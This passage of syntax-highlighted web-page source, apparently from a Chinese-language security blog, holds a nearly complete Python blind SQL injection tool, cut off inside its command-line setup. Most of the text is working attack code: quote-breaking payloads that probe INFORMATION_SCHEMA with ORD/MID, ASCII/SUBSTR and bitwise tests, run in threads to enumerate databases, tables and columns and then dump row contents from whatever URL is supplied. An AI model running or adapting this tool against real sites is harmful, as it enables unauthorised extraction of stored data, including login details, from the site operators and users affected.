class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">\"')\"</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span 